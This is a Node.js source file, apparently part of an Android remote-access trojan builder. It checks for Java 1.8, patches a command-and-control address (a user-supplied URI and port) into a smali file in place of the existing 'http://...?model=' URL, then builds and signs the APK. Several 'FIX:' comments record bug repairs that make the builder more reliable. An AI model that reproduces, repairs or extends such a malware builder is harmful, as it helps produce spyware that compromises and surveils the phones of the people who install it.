const
    cp = require('child_process'),
    fs = require('fs'),
    CONST = require('./const');

function javaversion(callback) {
    let spawn = cp.spawn('java', ['-version']);
    let output = "";
    spawn.on('error', (err) => callback("Unable to spawn Java - " + err, null));
    spawn.stderr.on('data', (data) => {
        output += data.toString();
    });
    spawn.on('close', function (code) {
        let javaIndex = output.indexOf('java version');
        let openJDKIndex = output.indexOf('openjdk version');
        let javaVersion = (javaIndex !== -1) ? output.substring(javaIndex, (javaIndex + 27)) : "";
        let openJDKVersion = (openJDKIndex !== -1) ? output.substring(openJDKIndex, (openJDKIndex + 27)) : "";

        // FIX: `openJDKVersion = "1.8.0"` was hardcoded here, which forced the check to always pass.
        // Removed the hardcode so real version is compared.

        if (javaVersion !== "" || openJDKVersion !== "") {
            if (javaVersion.includes("1.8.0") || openJDKVersion.includes("1.8.0")) {
                spawn.removeAllListeners();
                spawn.stderr.removeAllListeners();
                return callback(null, (javaVersion || openJDKVersion));
            } else return callback("Wrong Java Version Installed. Detected " + (javaVersion || openJDKVersion) + ". Please use Java 1.8.0", undefined);
        } else return callback("Java Not Installed", undefined);
    });
}

function patchAPK(URI, PORT, cb) {
    // FIX: original had `if (PORT < 65535)` with no else branch, so invalid ports hung forever.
    // Also 65535 is a valid port, so use `<= 65535`.
    if (!(PORT > 0 && PORT <= 65535)) {
        return cb('Invalid Port');
    }

    fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
        if (err) return cb('File Patch Error - READ');

        // FIX: if the marker isn't found, `indexOf` returns -1 and substring goes crazy.
        let startIdx = data.indexOf("http://");
        let endIdx = data.indexOf("?model=");
        if (startIdx === -1 || endIdx === -1 || endIdx <= startIdx) {
            return cb('Patch Marker Not Found In Smali');
        }

        var result = data.replace(data.substring(startIdx, endIdx), "http://" + URI + ":" + PORT);
        fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
            if (err) return cb('File Patch Error - WRITE');
            else return cb(false);
        });
    });
}

function buildAPK(cb) {
    javaversion(function (err, version) {
        if (!err) cp.exec(CONST.buildCommand, (error, stdout, stderr) => {
            if (error) return cb('Build Command Failed - ' + error.message);
            else cp.exec(CONST.signCommand, (error, stdout, stderr) => {
                if (!error) return cb(false);
                else return cb('Sign Command Failed - ' + error.message);
            });
        });
        else return cb(err);
    });
}

module.exports = {
    buildAPK,
    patchAPK
};